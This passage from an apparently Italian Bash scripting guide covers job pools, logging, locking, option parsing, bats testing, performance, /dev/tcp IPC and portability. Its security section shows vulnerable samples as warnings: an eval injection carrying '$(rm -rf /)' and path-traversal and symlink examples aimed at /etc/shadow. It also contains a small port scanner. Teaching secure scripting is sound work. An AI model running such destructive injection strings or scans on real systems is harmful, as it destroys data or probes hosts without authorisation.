    'expensive_command {}' ::: $(seq 1 1000)
```

Riferimento: `man parallel`, `parallel --citation`. GNU Parallel documentazione:
https://www.gnu.org/software/parallel/. Consultato: 2026-05-23.

### Pattern: Pool di Worker con File Descriptor

```bash
#!/usr/bin/env bash
set -euo pipefail

MAX_JOBS=4
FIFO="/tmp/job_pool_$$"
mkfifo "$FIFO"
trap 'rm -f "$FIFO"' EXIT

# Inizializza il pool: scrivi N token nel FIFO
exec 3<>"$FIFO"
for ((i = 0; i < MAX_JOBS; i++)); do
    echo >&3
done

run_limited() {
    local cmd="$1"
    read -u 3             # Consuma un token (blocca se nessuno disponibile)
    {
        eval "$cmd"
        echo >&3          # Rilascia il token
    } &
}

# Uso: 20 task con massimo 4 paralleli
for i in $(seq 1 20); do
    run_limited "echo 'Task $i start'; sleep 1; echo 'Task $i done'"
done

wait
exec 3>&-
echo "Tutti i task completati"
```

### Raccolta Risultati da Job Paralleli

```bash
#!/usr/bin/env bash
set -euo pipefail

RESULTS_DIR="$(mktemp -d)"
trap 'rm -rf "$RESULTS_DIR"' EXIT

# Ogni job scrive il suo risultato in un file separato
check_host() {
    local host="$1"
    local result_file="$RESULTS_DIR/$host"
    if ping -c 1 -W 2 "$host" >/dev/null 2>&1; then
        echo "UP" > "$result_file"
    else
        echo "DOWN" > "$result_file"
    fi
}

hosts=(web0{1..5}.example.com db0{1..3}.example.com)

for host in "${hosts[@]}"; do
    check_host "$host" &
done
wait

# Raccogli e mostra i risultati
for host in "${hosts[@]}"; do
    status=$(<"$RESULTS_DIR/$host")
    printf '%-30s %s\n' "$host" "$status"
done
```

---

## Logging Strutturato

Uno script production-ready richiede logging strutturato: timestamp, livelli, rotazione, e la possibilità di inviare i log sia a file che a stdout/syslog. Questa sezione presenta i pattern fondamentali.

### Funzione di Log con Livelli

```bash
#!/usr/bin/env bash

# ── Configurazione ─────────────────────────────────────────────────
declare -A LOG_LEVEL_NUM=( [DEBUG]=0 [INFO]=1 [WARN]=2 [ERROR]=3 [FATAL]=4 )
LOG_LEVEL="${LOG_LEVEL:-INFO}"
LOG_FILE="${LOG_FILE:-/dev/null}"
LOG_FORMAT="${LOG_FORMAT:-text}"  # text | json

# ── Funzione di log ────────────────────────────────────────────────
log() {
    local level="$1"
    shift
    local message="$*"

    # Filtro per livello
    local current_num="${LOG_LEVEL_NUM[$LOG_LEVEL]:-1}"
    local msg_num="${LOG_LEVEL_NUM[$level]:-1}"
    (( msg_num < current_num )) && return 0

    local timestamp
    timestamp="$(date -u '+%Y-%m-%dT%H:%M:%S.%3NZ')"  # ISO 8601 UTC
    local caller="${FUNCNAME[1]:-main}"
    local lineno="${BASH_LINENO[0]}"

    if [[ "$LOG_FORMAT" == "json" ]]; then
        printf '{"ts":"%s","level":"%s","caller":"%s:%d","msg":"%s"}\n' \
            "$timestamp" "$level" "$caller" "$lineno" "$message"
    else
        printf '[%s] [%-5s] [%s:%d] %s\n' \
            "$timestamp" "$level" "$caller" "$lineno" "$message"
    fi
}

# ── Wrapper per tee su file e stderr ───────────────────────────────
setup_logging() {
    local log_file="${1:-$LOG_FILE}"
    if [[ "$log_file" != "/dev/null" ]]; then
        # Redirige stderr attraverso tee: scrive su file E su stderr originale
        exec > >(tee -a "$log_file") 2>&1
    fi
}

# ── Uso ────────────────────────────────────────────────────────────
setup_logging "/var/log/myscript.log"

log DEBUG "Dettaglio di debug per sviluppatori"
log INFO  "Avvio elaborazione batch"
log WARN  "Disco al 85%, considerare pulizia"
log ERROR "Connessione al database fallita dopo 3 tentativi"
log FATAL "Impossibile continuare, uscita"
```

### Integrazione con Syslog tramite `logger`

```bash
#!/usr/bin/env bash
# logger invia messaggi al syslog del sistema (rsyslog, systemd-journald)

# Base
logger "Script backup completato"

# Con priorità (facility.severity)
logger -p local0.info "Backup completato con successo"
logger -p local0.err  "Backup fallito: disco pieno"

# Con tag (nome dello script)
logger -t "backup-rotator" -p local0.info "Rotazione completata"

# Funzione wrapper per syslog + stderr
syslog() {
    local priority="$1"
    shift
    local message="$*"
    local tag="${SCRIPT_NAME:-script}"

    logger -t "$tag" -p "local0.$priority" "$message"
    printf '[%s] [%s] %s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
        "${priority^^}" "$message" >&2
}

syslog info  "Avvio procedura"
syslog err   "Errore critico"

# Lettura dal journal (systemd)
# journalctl -t backup-rotator --since "1 hour ago"
```

### Pattern: Log Rotation Inline

```bash
#!/usr/bin/env bash
# Rotazione semplice dei log all'interno dello script

rotate_log() {
    local log_file="$1"
    local max_size="${2:-10485760}"  # 10 MB default
    local keep="${3:-5}"            # numero di file da mantenere

    [[ ! -f "$log_file" ]] && return 0

    local size
    size=$(stat -c%s "$log_file" 2>/dev/null || echo 0)

    if (( size > max_size )); then
        # Ruota i file esistenti
        for (( i = keep - 1; i >= 1; i-- )); do
            local prev=$(( i - 1 ))
            [[ -f "${log_file}.${prev}.gz" ]] && mv "${log_file}.${prev}.gz" "${log_file}.${i}.gz"
        done

        # Comprimi il log corrente
        gzip -c "$log_file" > "${log_file}.0.gz"
        : > "$log_file"  # Tronca senza cambiare inode

        logger -t "log-rotator" "Rotazione eseguita: $log_file (era $size byte)"
    fi
}

# Chiamata all'avvio dello script
rotate_log "/var/log/myscript.log" 5242880 3
```

---

## Lock File e Mutua Esclusione

Quando uno script non deve avere istanze concorrenti (backup, cron job, daemon), servono meccanismi di locking affidabili. L'approccio più robusto su Linux è `flock(1)`, che sfrutta i lock advisory del kernel e si rilascia automaticamente alla chiusura del file descriptor.

### `flock` — Pattern Fondamentale

```bash
#!/usr/bin/env bash
set -euo pipefail

LOCKFILE="/var/lock/myscript.lock"

# Metodo 1: flock con file descriptor (preferito)
exec 9>"$LOCKFILE"
if ! flock -n 9; then
    echo "Un'altra istanza è già in esecuzione" >&2
    exit 1
fi
# Il lock è automaticamente rilasciato quando il file descriptor 9 si chiude
# (cioè quando lo script termina, anche su SIGTERM/SIGINT)

echo "Lock acquisito, PID $$"
# ... logica dello script ...
```

### `flock` — Wrapper Self-Locking

```bash
#!/usr/bin/env bash
set -euo pipefail

# Lo script si ri-esegue sotto flock se non è già locked
LOCKFILE="/var/lock/${0##*/}.lock"

if [[ "${FLOCKER:-}" != "$0" ]]; then
    exec env FLOCKER="$0" flock -en "$LOCKFILE" "$0" "$@"
fi

# Da questo punto il lock è garantito
echo "Esecuzione esclusiva, PID $$"
# ... logica dello script ...
```

### `flock` — Timeout e Shared Lock

```bash
#!/usr/bin/env bash
set -euo pipefail

LOCKFILE="/var/lock/resource.lock"

# Lock con timeout (10 secondi)
exec 9>"$LOCKFILE"
if ! flock -w 10 9; then
    echo "Timeout: impossibile acquisire il lock entro 10 secondi" >&2
    exit 1
fi

# Shared lock (lettura concorrente, scrittura esclusiva)
exec 9>"$LOCKFILE"
flock -s 9                      # Shared lock: multipli reader OK
data=$(cat /path/to/shared_data)
flock -u 9                      # Rilascio esplicito

exec 9>"$LOCKFILE"
flock -x 9                      # Exclusive lock: un solo writer
echo "nuovi dati" > /path/to/shared_data
flock -u 9
```

### Confronto: `flock` vs PID File

| Aspetto | `flock` | PID file (`echo $$ > file`) |
|---|---|---|
| Race condition | Immune (atomico nel kernel) | Vulnerabile (check-then-act) |
| Rilascio su crash | Automatico (fd chiuso) | Manuale (PID file rimane — stale lock) |
| Rilascio su SIGKILL | Automatico | NO — richiede cleanup manuale |
| Portabilità | Linux, *BSD | POSIX (ma fragile) |
| Semplicità | Alta | Media (richiede stale-lock detection) |

Riferimento: `man flock`, `man 2 flock`. Consultato: 2026-05-23.

### Pattern: Operazioni Atomiche su File

```bash
#!/usr/bin/env bash
set -euo pipefail

# Scrittura atomica: scrivi su file temporaneo, poi rename (atomico su stesso filesystem)
atomic_write() {
    local target="$1"
    local content="$2"
    local tmpfile
    tmpfile="$(mktemp "${target}.XXXXXX")"

    # Preserva permessi se il file esiste
    if [[ -f "$target" ]]; then
        chmod --reference="$target" "$tmpfile" 2>/dev/null || true
    fi

    printf '%s' "$content" > "$tmpfile"
    sync "$tmpfile"                    # Flush su disco
    mv -f "$tmpfile" "$target"         # Rename atomico (stesso filesystem)
}

# Uso
atomic_write "/etc/myapp/state.json" '{"status":"running","pid":'"$$"'}'
```

---

## Parsing di Configurazione

### `getopts` — Approfondimento

`getopts` è il built-in POSIX per il parsing di opzioni corte. È preferibile a `getopt` (comando esterno) per la portabilità e la gestione corretta di argomenti con spazi.

```bash
#!/usr/bin/env bash
set -euo pipefail

# Variabili con default
VERBOSE=false
OUTPUT_FILE=""
COUNT=1
DRY_RUN=false

usage() {
    cat <<'EOF'
Uso: script.sh [-v] [-n] [-o FILE] [-c NUM] [-h] [--] ARG...

  -v         Output verboso
  -n         Dry run (non esegue azioni)
  -o FILE    File di output
  -c NUM     Numero di iterazioni (default: 1)
  -h         Mostra questo help
  --         Fine delle opzioni
EOF
}

while getopts ":vno:c:h" opt; do
    case "$opt" in
        v) VERBOSE=true ;;
        n) DRY_RUN=true ;;
        o) OUTPUT_FILE="$OPTARG" ;;
        c)
            if [[ ! "$OPTARG" =~ ^[0-9]+$ ]]; then
                echo "Errore: -c richiede un numero intero" >&2
                exit 1
            fi
            COUNT="$OPTARG"
            ;;
        h) usage; exit 0 ;;
        :) echo "Errore: -$OPTARG richiede un argomento" >&2; exit 1 ;;
        \?) echo "Errore: opzione sconosciuta -$OPTARG" >&2; exit 1 ;;
    esac
done
shift $((OPTIND - 1))

# $@ contiene ora solo gli argomenti posizionali
echo "Verbose=$VERBOSE DryRun=$DRY_RUN Output=$OUTPUT_FILE Count=$COUNT Args=$*"
```

### `getopt` — Opzioni Lunghe (solo GNU)

```bash
#!/usr/bin/env bash
set -euo pipefail

# getopt GNU supporta opzioni lunghe. NON usare getopt BSD (non compatibile).
# Verificare: getopt --test; echo $? (4 = GNU, altro = BSD/incompatibile)

PARSED=$(getopt \
    --options 'vo:c:hn' \
    --longoptions 'verbose,output:,count:,help,dry-run' \
    --name "$0" \
    -- "$@") || exit 1

eval set -- "$PARSED"

VERBOSE=false
OUTPUT_FILE=""
COUNT=1
DRY_RUN=false

while true; do
    case "$1" in
        -v|--verbose)  VERBOSE=true; shift ;;
        -n|--dry-run)  DRY_RUN=true; shift ;;
        -o|--output)   OUTPUT_FILE="$2"; shift 2 ;;
        -c|--count)    COUNT="$2"; shift 2 ;;
        -h|--help)     usage; exit 0 ;;
        --)            shift; break ;;
        *)             echo "Errore interno" >&2; exit 1 ;;
    esac
done

echo "Argomenti rimanenti: $*"
```

### Source Sicuro di File di Configurazione

```bash
#!/usr/bin/env bash
set -euo pipefail

# MAI fare `source` di un file non controllato! Può eseguire codice arbitrario.

# Pattern sicuro: parsing manuale con validazione
load_config_safe() {
    local config_file="$1"

    [[ -f "$config_file" ]] || { echo "Config non trovata: $config_file" >&2; return 1; }

    # Verifica permessi (il file config non deve essere world-writable)
    local perms
    perms=$(stat -c '%a' "$config_file")
    if [[ "${perms: -1}" =~ [2367] ]]; then
        echo "ATTENZIONE: $config_file è world-writable (permessi: $perms)" >&2
        return 1
    fi

    while IFS='=' read -r key value; do
        # Ignora commenti e righe vuote
        key="${key%%#*}"
        key="${key// /}"
        [[ -z "$key" ]] && continue

        # Rimuovi apici dal valore
        value="${value#"${value%%[![:space:]]*}"}"  # trim leading whitespace
        value="${value%"${value##*[![:space:]]}"}"  # trim trailing whitespace
        value="${value#[\"\']}"
        value="${value%[\"\']}"

        # Whitelist di chiavi ammesse
        case "$key" in
            DB_HOST|DB_PORT|DB_NAME|DB_USER|APP_ENV|APP_PORT|LOG_LEVEL)
                declare -g "$key=$value"
                ;;
            *)
                echo "Chiave di configurazione ignorata: $key" >&2
                ;;
        esac
    done < "$config_file"
}

# Uso
load_config_safe "/etc/myapp/config.env"
echo "DB_HOST=${DB_HOST:-non definito}"
```

### Configurazione tramite Heredoc

```bash
#!/usr/bin/env bash
set -euo pipefail

# Generazione di configurazione multi-riga con validazione
generate_config() {
    local env="${1:?Ambiente richiesto: dev|staging|production}"
    local app_port="${2:-8080}"

    case "$env" in
        dev|staging|production) ;;
        *) echo "Ambiente non valido: $env" >&2; return 1 ;;
    esac

    cat <<EOF
# Generato automaticamente — non modificare manualmente
# Data: $(date -u +%Y-%m-%dT%H:%M:%SZ)
# Ambiente: $env

APP_ENV=$env
APP_PORT=$app_port
LOG_LEVEL=$(  [[ "$env" == "dev" ]] && echo "DEBUG" || echo "INFO" )
DB_HOST=$(    [[ "$env" == "production" ]] && echo "db.prod.internal" || echo "localhost" )
DB_PORT=5432
CACHE_TTL=$(  [[ "$env" == "production" ]] && echo "3600" || echo "60" )
EOF
}

# Genera e salva atomicamente
config_content="$(generate_config "production" 9090)"
atomic_write "/etc/myapp/app.conf" "$config_content"
```

---

## Testing di Script Bash

Il testing degli script Bash è spesso trascurato, ma è fondamentale per script che gestiscono infrastruttura critica. `bats-core` (Bash Automated Testing System) è il framework standard de facto.

### Installazione di bats-core

```bash
# Metodo 1: package manager
sudo apt install bats          # Debian/Ubuntu
sudo dnf install bats          # Fedora

# Metodo 2: da sorgente (versione più recente)
git clone https://github.com/bats-core/bats-core.git
cd bats-core
sudo ./install.sh /usr/local

# Plugin utili
git clone https://github.com/bats-core/bats-support.git test/test_helper/bats-support
git clone https://github.com/bats-core/bats-assert.git  test/test_helper/bats-assert
git clone https://github.com/bats-core/bats-file.git    test/test_helper/bats-file
```

### Struttura di un Test bats

```bash
#!/usr/bin/env bats
# test/test_utils.bats

# ── Setup e teardown ───────────────────────────────────────────────
setup() {
    # Carica helper
    load 'test_helper/bats-support/load'
    load 'test_helper/bats-assert/load'

    # Crea directory temporanea per il test
    TEST_TEMP="$(mktemp -d)"
    export TEST_TEMP

    # Carica le funzioni da testare
    source "${BATS_TEST_DIRNAME}/../lib/utils.sh"
}

teardown() {
    rm -rf "$TEST_TEMP"
}

# ── Test ───────────────────────────────────────────────────────────
@test "format_bytes converte byte in formato leggibile" {
    run format_bytes 1048576
    assert_success
    assert_output "1.00 MB"
}

@test "format_bytes gestisce zero" {
    run format_bytes 0
    assert_success
    assert_output "0 B"
}

@test "parse_config fallisce con file inesistente" {
    run parse_config "/percorso/inesistente"
    assert_failure
    assert_output --partial "non trovato"
}

@test "parse_config carica valori corretti" {
    cat > "$TEST_TEMP/test.conf" <<'EOF'
host = localhost
port = 5432
EOF
    run parse_config "$TEST_TEMP/test.conf"
    assert_success
}

@test "validate_ip accetta IP valido" {
    run validate_ip "192.168.1.1"
    assert_success
}

@test "validate_ip rifiuta IP non valido" {
    run validate_ip "999.999.999.999"
    assert_failure
}

@test "cleanup rimuove file temporanei" {
    local tmpfile="$TEST_TEMP/testfile"
    touch "$tmpfile"
    assert_file_exists "$tmpfile"

    TMPDIR_PATH="$TEST_TEMP"
    cleanup
    assert_file_not_exists "$tmpfile"
}
```

### Esecuzione dei Test

```bash
# Esecui tutti i test
bats test/

# Test specifico
bats test/test_utils.bats

# Output TAP (Test Anything Protocol) per CI
bats --tap test/

# Output con timing
bats --timing test/

# Filtro per nome
bats --filter "format_bytes" test/
```

### ShellCheck — Analisi Statica

```bash
# Installazione
sudo apt install shellcheck      # Debian/Ubuntu
sudo dnf install ShellCheck      # Fedora

# Uso base
shellcheck script.sh

# Escludere specifici warning
shellcheck --exclude=SC2086,SC2034 script.sh

# Formato per CI (json, gcc, checkstyle)
shellcheck --format=gcc script.sh

# Controllare tutti gli script ricorsivamente
find . -name '*.sh' -exec shellcheck {} +

# Direttive inline per eccezioni giustificate
# shellcheck disable=SC2086
unquoted_expansion $var   # Giustificazione: $var è garantito senza spazi
```

### Pipeline CI/CD per Script Bash

```yaml
# .github/workflows/bash-tests.yml
name: Bash Tests

on:
  push:
    paths: ['scripts/**', 'lib/**', 'test/**']
  pull_request:
    paths: ['scripts/**', 'lib/**', 'test/**']

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: ShellCheck
        run: |
          find scripts/ lib/ -name '*.sh' -print0 \
            | xargs -0 shellcheck --severity=warning --format=gcc

  test:
    runs-on: ubuntu-latest
    needs: lint
    steps:
      - uses: actions/checkout@v4
      - name: Installa bats e helper
        run: |
          sudo apt-get update && sudo apt-get install -y bats
          git clone --depth 1 https://github.com/bats-core/bats-support.git test/test_helper/bats-support
          git clone --depth 1 https://github.com/bats-core/bats-assert.git  test/test_helper/bats-assert
      - name: Esegui test
        run: bats --tap test/
```

Riferimento: bats-core documentazione: https://bats-core.readthedocs.io/.
ShellCheck wiki: https://github.com/koalaman/shellcheck/wiki. Consultato: 2026-05-23.

---

## Performance

Gli script Bash possono essere sorprendentemente veloci se si evitano i pattern costosi (subshell inutili, fork di processi esterni per operazioni che Bash gestisce nativamente). Questa sezione copre le ottimizzazioni più impattanti e gli strumenti di benchmarking.

### Evitare Subshell Non Necessarie

Ogni `$(...)` o `(...)` crea un fork — un nuovo processo con il suo PID. Su sistemi con centinaia di migliaia di iterazioni, la differenza è enorme.

```bash
# LENTO: 3 fork per ogni iterazione
while IFS= read -r line; do
    filename=$(basename "$line")           # fork 1
    extension=$(echo "$filename" | cut -d. -f2)  # fork 2 + fork 3
    echo "$extension"
done < file_list.txt

# VELOCE: 0 fork, tutto con parameter expansion
while IFS= read -r line; do
    filename="${line##*/}"                 # basename senza fork
    extension="${filename##*.}"            # estensione senza fork
    echo "$extension"
done < file_list.txt
```

### Operazioni su Stringhe Built-in vs Comandi Esterni

```bash
var="Hello, World! This is a test."

# ── Sostituzione ──────────────────────────────────────────────────
# LENTO: echo "$var" | sed 's/World/Bash/'
# VELOCE:
echo "${var/World/Bash}"        # Prima occorrenza
echo "${var//i/I}"              # Tutte le occorrenze

# ── Estrazione ────────────────────────────────────────────────────
# LENTO: echo "$var" | cut -c1-5
# VELOCE:
echo "${var:0:5}"               # Substring: offset, lunghezza

# ── Lunghezza ─────────────────────────────────────────────────────
# LENTO: echo "$var" | wc -c
# VELOCE:
echo "${#var}"                  # Lunghezza in caratteri

# ── Maiuscolo/Minuscolo (Bash 4.0+) ──────────────────────────────
echo "${var^^}"                 # TUTTO MAIUSCOLO
echo "${var,,}"                 # tutto minuscolo
echo "${var^}"                  # Prima lettera maiuscola

# ── Rimozione prefisso/suffisso ───────────────────────────────────
filepath="/var/log/nginx/access.log"
echo "${filepath##*/}"          # access.log  (basename)
echo "${filepath%/*}"           # /var/log/nginx  (dirname)
echo "${filepath%.log}"         # /var/log/nginx/access
echo "${filepath%%/*}"          # (stringa vuota — rimuove tutto dopo il primo /)
```

### `printf` vs `echo`

```bash
# echo ha comportamento non portabile:
echo -e "tab\there"       # Funziona in Bash, non in sh
echo -n "no newline"      # Non universale

# printf è POSIX e prevedibile:
printf 'tab\there\n'
printf 'no newline'
printf '%s: %d connessioni\n' "web01" 42

# printf è anche più veloce per output formattato in loop:
# LENTO
for i in $(seq 1 10000); do
    echo "$(date +%T) Linea $i"    # fork per date a ogni iterazione!
done

# VELOCE
ts=$(date +%T)
for i in $(seq 1 10000); do
    printf '%s Linea %d\n' "$ts" "$i"
done
```

### Benchmarking con `time` e `hyperfine`

```bash
# time (built-in)
time {
    for i in $(seq 1 10000); do
        : "${i##0}"
    done
}
# real    0m0.045s
# user    0m0.040s
# sys     0m0.005s

# BASH_TIMEFORMAT per output personalizzato
TIMEFORMAT='Durata: %3R secondi (user: %3U, sys: %3S)'
time sleep 1

# hyperfine — benchmarking statistico (installare: cargo install hyperfine)
# Confronto tra due implementazioni
hyperfine \
    'bash script_v1.sh' \
    'bash script_v2.sh' \
    --warmup 3 \
    --min-runs 10

# Confronto parametrico
hyperfine \
    --parameter-scan size 100 1000 -D 100 \
    'bash process.sh {size}'

# Export risultati
hyperfine --export-markdown results.md 'bash script.sh'
```

### Ottimizzazioni per Loop I/O-Intensive

```bash
# LENTO: read da file riga per riga con echo e pipe
while IFS= read -r line; do
    echo "$line" | grep -q "pattern" && echo "$line"
done < input.txt

# VELOCE: usa il pattern matching built-in di Bash
while IFS= read -r line; do
    [[ "$line" == *pattern* ]] && printf '%s\n' "$line"
done < input.txt

# ANCORA PIÙ VELOCE: delega a grep (uno solo, non in loop)
grep "pattern" input.txt

# REGOLA GENERALE: se puoi farlo con un singolo invocazione di awk/sed/grep,
# è quasi sempre più veloce di un while-read loop in Bash.
# Il loop Bash ha senso quando serve logica condizionale complessa
# che non si esprime bene in awk.

# Buffering dell'output: printf accumulato
{
    for i in $(seq 1 10000); do
        printf 'riga %d\n' "$i"
    done
} > output.txt   # Un'unica apertura file, non 10000 append
```

---

## IPC Avanzato

Oltre alle named pipe, Bash offre meccanismi di comunicazione inter-processo (IPC) più avanzati: socket TCP/UDP, /dev/shm per memoria condivisa, e coppie di file descriptor.

### Socket TCP/UDP con `/dev/tcp` e `/dev/udp`

Bash ha un meccanismo built-in (non POSIX, non attivato su tutte le build) per aprire connessioni TCP e UDP come file descriptor:

```bash
#!/usr/bin/env bash
set -euo pipefail

# Verifica disponibilità
if ! echo >/dev/tcp/localhost/22 2>/dev/null; then
    echo "NOTA: /dev/tcp potrebbe non essere abilitato in questa build di Bash"
fi

# ── HTTP GET senza curl/wget ──────────────────────────────────────
http_get() {
    local host="$1"
    local port="${2:-80}"
    local path="${3:-/}"

    exec 3<>/dev/tcp/"$host"/"$port"

    # Invia la richiesta
    printf 'GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n' \
        "$path" "$host" >&3

    # Leggi la risposta
    cat <&3

    exec 3>&-
}

# Uso
http_get "example.com" 80 "/" | head -20

# ── Port scanner minimale ─────────────────────────────────────────
scan_port() {
    local host="$1"
    local port="$2"
    local timeout="${3:-1}"

    if timeout "$timeout" bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null; then
        echo "OPEN:   $host:$port"
    else
        echo "CLOSED: $host:$port"
    fi
}

# Scansione parallela
for port in 22 80 443 3306 5432 6379 8080; do
    scan_port "localhost" "$port" &
done
wait

# ── Invio a UDP syslog ────────────────────────────────────────────
udp_syslog() {
    local server="$1"
    local message="$2"
    local facility=1    # user
    local severity=6    # info
    local priority=$(( facility * 8 + severity ))

    echo "<$priority>$(date '+%b %d %H:%M:%S') $(hostname) script: $message" \
        > /dev/udp/"$server"/514
}
```

### Memoria Condivisa tramite `/dev/shm`

`/dev/shm` è un filesystem tmpfs montato in RAM. È perfetto per condividere dati tra processi correlati senza I/O su disco:

```bash
#!/usr/bin/env bash
set -euo pipefail

SHM_DIR="/dev/shm/myapp_$$"
mkdir -p "$SHM_DIR"
trap 'rm -rf "$SHM_DIR"' EXIT

# Worker: scrive risultati in /dev/shm
worker() {
    local id="$1"
    local result_file="$SHM_DIR/result_$id"

    # Simulazione di lavoro computazionale
    local sum=0
    for ((i = id * 1000; i < (id + 1) * 1000; i++)); do
        (( sum += i ))
    done

    echo "$sum" > "$result_file"
}

# Avvia 4 worker paralleli
for w in 0 1 2 3; do
    worker "$w" &
done
wait

# Aggrega i risultati
total=0
for f in "$SHM_DIR"/result_*; do
    partial=$(<"$f")
    (( total += partial ))
done
echo "Somma totale: $total"
```

### Coproc — Processo Cooperativo

`coproc` (Bash 4.0+) avvia un processo in background con i suoi stdin/stdout collegati a file descriptor della shell padre:

```bash
#!/usr/bin/env bash
set -euo pipefail

# Avvia un coprocesso
coproc WORKER {
    while IFS= read -r line; do
        echo "ELABORATO: $(echo "$line" | tr '[:lower:]' '[:upper:]')"
    done
}

# Scrivi nel coprocesso e leggi la risposta
echo "ciao mondo" >&"${WORKER[1]}"
read -r response <&"${WORKER[0]}"
echo "Risposta: $response"  # ELABORATO: CIAO MONDO

echo "altra riga" >&"${WORKER[1]}"
read -r response <&"${WORKER[0]}"
echo "Risposta: $response"  # ELABORATO: ALTRA RIGA

# Chiudi l'input del coprocesso
exec {WORKER[1]}>&-
wait "$WORKER_PID" 2>/dev/null || true
```

---

## Portabilità

Scrivere script che funzionino su distribuzioni e shell diverse richiede consapevolezza delle differenze tra Bash e POSIX sh, e delle estensioni non portabili.

### Bash vs POSIX `sh` — Differenze Chiave

| Funzionalità | Bash | POSIX sh |
|---|---|---|
| `[[ ]]` | Sì | No — usare `[ ]` |
| Array | Sì (`declare -a`, `declare -A`) | No |
| `${var//pattern/replace}` | Sì | No |
| `${var^^}` / `${var,,}` | Sì (4.0+) | No |
| Process substitution `<()` | Sì | No |
| `<<<` (here string) | Sì | No |
| `(( ))` aritmetica | Sì | No — usare `$(( ))` o `expr` |
| `local` in funzioni | Sì | Non standardizzato (ma ampiamente supportato) |
| `source` | Sì | No — usare `.` (dot) |
| `select` | Sì | No |
| `coproc` | Sì (4.0+) | No |
| `shopt` | Sì | No |
| `FUNCNAME`, `BASH_SOURCE` | Sì | No |

### Bashismi Comuni da Evitare (se si vuole portabilità POSIX)

```bash
# ── Shebang ───────────────────────────────────────────────────────
#!/usr/bin/env bash     # Portabile, cerca bash nel PATH
#!/bin/bash             # Non portabile: su NixOS, FreeBSD, macOS (senza Homebrew)
                        # bash potrebbe non essere in /bin
#!/bin/sh               # POSIX sh — potrebbe essere dash, ash, busybox sh

# ── Test ──────────────────────────────────────────────────────────
# Bashismo:
[[ "$var" == pattern* ]] && echo "match"
# POSIX:
case "$var" in pattern*) echo "match" ;; esac

# ── Aritmetica ────────────────────────────────────────────────────
# Bashismo:
(( x > 5 )) && echo "grande"
# POSIX:
[ "$x" -gt 5 ] && echo "grande"

# ── Funzioni ──────────────────────────────────────────────────────
# Bashismo:
function myfunc() { local x=1; }
# POSIX:
myfunc() { x=1; }   # 'local' non è standard ma ampiamente supportato

# ── Sostituzione ──────────────────────────────────────────────────
# Bashismo:
echo "${var/old/new}"
# POSIX (con sed):
echo "$var" | sed 's/old/new/'
```

### Script Portabile: Checklist

```bash
#!/bin/sh
# Script portabile POSIX

# 1. Niente [[ ]], usare [ ] con quoting
if [ "$var" = "value" ]; then echo "ok"; fi

# 2. Niente array — usare posizionali o file temporanei
set -- "item1" "item2" "item3"
for item in "$@"; do echo "$item"; done

# 3. Niente (( )) — usare $(( )) o [ ]
result=$(( x + y ))
if [ "$x" -gt 5 ]; then echo "grande"; fi

# 4. Niente <<<, usare printf | cmd
printf '%s' "$var" | cut -d: -f1

# 5. Niente <(), usare file temporanei
tmp1=$(mktemp)
trap 'rm -f "$tmp1"' EXIT
sort file1.txt > "$tmp1"
comm "$tmp1" <(sort file2.txt)  # Questo è un bashismo!
# POSIX:
tmp2=$(mktemp)
sort file2.txt > "$tmp2"
comm "$tmp1" "$tmp2"
rm -f "$tmp2"

# 6. echo è non portabile per opzioni -e/-n
# Usare printf
printf 'no newline'
printf 'tab\there\n'
```

Riferimento: POSIX.1-2024, Shell & Utilities:
https://pubs.opengroup.org/onlinepubs/9799919799/. Consultato: 2026-05-23.

---

## Sicurezza negli Script

Gli script Bash che interagiscono con input utente, rete o filesystem devono applicare le stesse precauzioni di qualsiasi altro software. Le vulnerabilità più comuni sono l'iniezione di comandi, l'uso improprio di `eval`, e le race condition su file temporanei.

### Sanitizzazione dell'Input

```bash
#!/usr/bin/env bash
set -euo pipefail

# MAI usare input utente direttamente in comandi
# VULNERABILE:
user_input="$1"
ls $user_input          # Glob expansion, word splitting
cat "$user_input"       # Path traversal: ../../etc/shadow

# ── Validazione con whitelist ─────────────────────────────────────
validate_username() {
    local input="$1"
    if [[ ! "$input" =~ ^[a-zA-Z0-9_]{3,32}$ ]]; then
        echo "Username non valido: $input" >&2
        return 1
    fi
    echo "$input"
}

validate_ip() {
    local input="$1"
    local octet='([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])'
    if [[ ! "$input" =~ ^${octet}\.${octet}\.${octet}\.${octet}$ ]]; then
        echo "IP non valido: $input" >&2
        return 1
    fi
    echo "$input"
}

validate_path() {
    local input="$1"
    local base_dir="$2"

    # Risolvi il percorso reale e verifica che sia sotto base_dir
    local resolved
    resolved="$(realpath -m "$input" 2>/dev/null)" || return 1

    if [[ "$resolved" != "$base_dir"/* ]]; then
        echo "Path traversal bloccato: $input risolve a $resolved" >&2
        return 1
    fi
    echo "$resolved"
}
```

### Pericoli di `eval`

```bash
# eval esegue il suo argomento come codice Bash. MAI usarlo con input non fidato.

# VULNERABILE — command injection:
user_input='$(rm -rf /)'
eval "echo $user_input"    # Esegue rm -rf / !

# Se devi costruire comandi dinamici, usa array:
# SICURO:
declare -a cmd=("ls" "-la" "--color=auto")
"${cmd[@]}"

# Se DEVI usare eval (raro, per metaprogrammazione interna),
# assicurati che l'input sia completamente controllato:
eval "$(declare -p array_var)"    # OK: declare -p produce output sicuro
```

### File Temporanei Sicuri con `mktemp`

```bash
#!/usr/bin/env bash
set -euo pipefail

# MAI usare nomi predicibili per file temporanei
# VULNERABILE a symlink attack:
echo "dati" > /tmp/myscript.tmp    # Un attaccante può creare un symlink /tmp/myscript.tmp -> /etc/shadow

# SICURO: mktemp crea file con nome casuale e permessi 0600
TMPFILE="$(mktemp)"
TMPDIR="$(mktemp -d)"
trap 'rm -f "$TMPFILE"; rm -rf "$TMPDIR"' EXIT

echo "dati sensibili" > "$TMPFILE"

# mktemp con template
TMPFILE="$(mktemp /tmp/myapp.XXXXXXXXXX)"     # X vengono sostituite con caratteri casuali

# Variabile TMPDIR: mktemp la rispetta
export TMPDIR="/secure/tmp"
mktemp   # Crea in /secure/tmp/

# Verifica che mktemp sia disponibile (sistemi embedded/minimal)
if ! command -v mktemp >/dev/null 2>&1; then
    # Fallback POSIX (meno sicuro)
    TMPFILE="/tmp/script.$$.$RANDOM"
    (umask 077; : > "$TMPFILE")
fi
```

### Prevenzione di Iniezione in Comandi Composti

```bash
#!/usr/bin/env bash
set -euo pipefail

# ── SQL injection via script ──────────────────────────────────────
# VULNERABILE:
